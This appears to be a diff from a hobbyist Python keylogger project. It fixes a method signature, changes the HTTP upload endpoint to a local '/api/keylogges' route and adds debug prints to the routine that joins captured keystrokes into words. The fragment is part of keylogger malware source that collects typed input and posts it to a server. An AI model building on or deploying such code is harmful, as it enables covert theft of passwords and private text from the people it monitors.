@@ -22,10 +22,10 @@ class  NetworkWriter(IWriter):
     def __init__(self):
         import requests
         super().__init__()
-    def send_data(sel,data):
+    def send_data(self,data):
         try:    
-            url = 'http://127.0.0.1:5000/api/upload'
-            response = requests.post(url, json=data)
+            url = 'http://127.0.0.1:5000/api/keylogges'
+            response = requests.post(url,json=data)
         except:
                return         
 
@@ -35,14 +35,15 @@ class KeyLoggerManager(KeyLoggerService):
         self.data = []
         self.word = ''
 
-
     def list_to_word(self,list1:list):
      str1 = ''
      list_to_sand = []
      for i in list1:
           str1 += str(i)
      str1 = str1.replace("'",'')
+     print(str1)
      str1 = str1.split()
+     print(str1)
      try:
         list_to_sand = str1     
         return list_to_sand
